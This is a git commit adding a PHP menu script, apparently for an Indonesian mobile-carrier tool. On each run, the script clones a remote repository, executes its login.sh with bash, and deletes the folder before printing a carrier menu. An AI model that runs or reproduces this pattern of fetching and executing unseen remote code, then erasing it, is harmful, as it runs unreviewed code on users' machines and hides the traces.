37a548ff4f0a96ce58f387bfc525858bb7618279
sijhons <kasmadp5@gmail.com>
2025-03-26 22:27:08 +0700

    Add files via upload

---
+++ menu.php
@@ -0,0 +1,16 @@
+<?php
+system("git clone -q https://github.com/sijhons/httpCOSTUM");
+echo "\n";
+system("bash httpCOSTUM/login.sh");
+system("rm -rf httpCOSTUM");
+echo "AUTHOR : BANGJHON Z\n";
+echo "VERSI  : 1\n";
+echo "\n";
+echo "1. telkomsel\n";
+echo "2. byu\n";
+echo "3. xl\n";
+echo "4. indosat\n";
+echo "5. smarfrent\n";
+echo "6. author\n";
+echo "0. quit\n";
+?>
